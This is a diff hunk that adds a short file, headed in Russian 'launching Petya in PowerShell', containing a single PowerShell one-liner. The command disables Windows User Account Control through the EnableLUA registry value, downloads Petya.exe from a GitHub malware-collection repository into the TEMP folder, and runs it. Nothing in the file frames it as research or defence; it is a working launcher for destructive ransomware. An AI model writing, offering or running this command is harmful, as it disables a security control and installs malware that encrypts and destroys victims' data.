@@ -1,0 +1,6 @@
+запуск пети в powershell
+
+
+
+
+powershell -Command Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System' -Name 'EnableLUA' -Value 0 -Force; Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/Zusyaku/Malware-Collection-Part-2/main/Petya.exe' -OutFile $env:TEMP\Petya.exe; Start-Process $env:TEMP\Petya.exe
